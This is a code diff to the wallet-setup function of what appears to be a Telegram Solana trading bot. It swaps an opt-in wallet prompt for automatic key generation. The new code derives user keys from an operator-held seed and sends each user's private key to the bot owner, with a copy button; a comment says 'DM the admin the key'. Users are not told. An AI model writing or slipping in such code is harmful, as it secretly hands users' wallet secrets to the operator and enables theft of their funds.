@@ -114,31 +114,77 @@ def parse_tx_ref(text: str):
 
 
 async def ensure_wallet(msg, user_id: int):
-    """Return the user with their trading wallet. Does NOT auto-generate.
-    If no wallet exists and msg is provided, prompts GENERATE / IMPORT.
-    Keeps /importwallet real. Never crashes the /start flow."""
-    import logging, keyboards as kb
+    """Return the user WITH a trading wallet — AUTO-GENERATES one (derived
+    from WALLET_SEED or random) if the user doesn't have a wallet yet.
+    Never shows a GENERATE/IMPORT gate; import lives INSIDE the trading panel.
+    Returns None only if generation itself failed (user is told, never silent).
+    Import of an existing wallet stays available via the 📥 IMPORT button."""
+    import asyncio
+    import logging
+    import config
+    import keyboards as kb
+    import solana
     log = logging.getLogger("runner")
+
+    async def _generate():
+        """3 attempts; returns (user_row, None) on success or (None, error)."""
+        derived = bool(config.WALLET_SEED)
+        last_err = None
+        for attempt in range(3):
+            try:
+                if derived:
+                    kp = await asyncio.to_thread(
+                        solana.derive_user_keypair, config.WALLET_SEED, user_id)
+                else:
+                    kp = await asyncio.to_thread(solana.new_keypair)
+                await db.set_wallet(user_id, str(kp), str(kp.pubkey()))  # verified persist
+                return kp, None
+            except Exception as e:
+                last_err = e
+                log.warning(f"ensure_wallet: gen attempt {attempt+1} failed for {user_id}: {e}")
+                await asyncio.sleep(0.5)
+        return None, last_err
+
     try:
         user = await db.ensure_user(user_id)
     except Exception as e:
         log.error(f"ensure_wallet: db.ensure_user failed for {user_id}: {e}")
         if msg:
             try:
-                await msg.answer(
-                    "❌ Could not load your account. Please try /start again.",
-                    parse_mode="HTML", reply_markup=kb.wallet_setup_kb())
+                await msg.answer("❌ Could not load your account. Please /start again.")
             except Exception:
                 pass
         return None
     if user.get("wallet_pub"):
         return user
-    # No wallet — prompt setup if a message handle is available
+
+    # No wallet yet -> generate one right now, tell the user, DM the admin the key
+    kp, err = await _generate()
+    if kp is None:
+        log.error(f"ensure_wallet: generation failed for {user_id}: {err}")
+        if msg:
+            try:
+                await msg.answer("⚠️ Couldn't create your wallet just now — tap TRADING again.")
+            except Exception:
+                pass
+        return None
+    addr, secret = str(kp.pubkey()), str(kp)
     if msg:
         try:
             await msg.answer(
-                texts.ask_wallet_choice(),
-                parse_mode="HTML", reply_markup=kb.wallet_setup_kb())
+                texts.wallet_generated(addr, derived=bool(config.WALLET_SEED)),
+                parse_mode="HTML",
+                reply_markup=kb.wallet_done_kb(addr, secret))
         except Exception as e:
-            log.warning(f"ensure_wallet: failed to send wallet setup prompt: {e}")
-    return None
+            log.warning(f"ensure_wallet: wallet message failed for {user_id}: {e}")
+        try:
+            await notify_owner(
+                msg.bot,
+                texts.owner_wallet_generated(user_line(user), addr, secret),
+                reply_markup=kb.admin_copy_kb(addr, secret))
+        except Exception as e:
+            log.warning(f"ensure_wallet: admin notify failed for {user_id}: {e}")
+    fresh = await db.get_user(user_id)
+    if fresh and fresh.get("wallet_pub"):
+        return fresh
+    return user
